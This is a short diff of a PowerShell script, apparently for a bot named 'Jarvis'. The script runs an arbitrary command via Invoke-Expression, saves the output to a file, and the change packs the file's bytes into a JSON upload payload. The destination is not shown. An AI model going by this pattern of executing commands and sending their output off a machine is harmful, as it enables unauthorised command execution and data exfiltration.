@@ -9,10 +9,12 @@ $output = Invoke-Expression $command
 # Salva il risultato in un file txt
 $output | Out-File $fileName
 
+$fileBytes = [System.IO.File]::ReadAllBytes($fileName)
+
 $payload = @{
     'username' = 'Jarvis'
     'content' = 'File allegato: $fileName'
-    'file' = $fileName
+    'file' = $fileBytes
 }
 
 $payloadString = $payload | ConvertTo-Json
